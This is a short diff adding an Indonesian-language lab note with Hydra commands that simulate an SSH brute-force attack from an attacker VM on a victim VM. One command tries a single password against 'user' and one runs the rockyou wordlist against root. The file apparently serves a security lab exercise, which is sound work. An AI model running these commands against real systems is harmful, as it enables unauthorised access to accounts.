@@ -1,0 +1,13 @@
+# Command untuk simulasi serangan SSH Brute-force menggunakan Hydra.
+# Jalankan dari mesin Attacker / Laptop Host.
+
+# Pastikan hydra sudah terinstall:
+# sudo apt install hydra -y
+
+# PENTING: Ganti <TARGET_IP> dengan IP dari VM 2 (Victim)
+
+1. Serangan dengan username spesifik (contoh: user/root) dan password acak:
+hydra -l user -p 123456 ssh://<TARGET_IP>
+
+2. Serangan menggunakan Wordlist (kamus password):
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
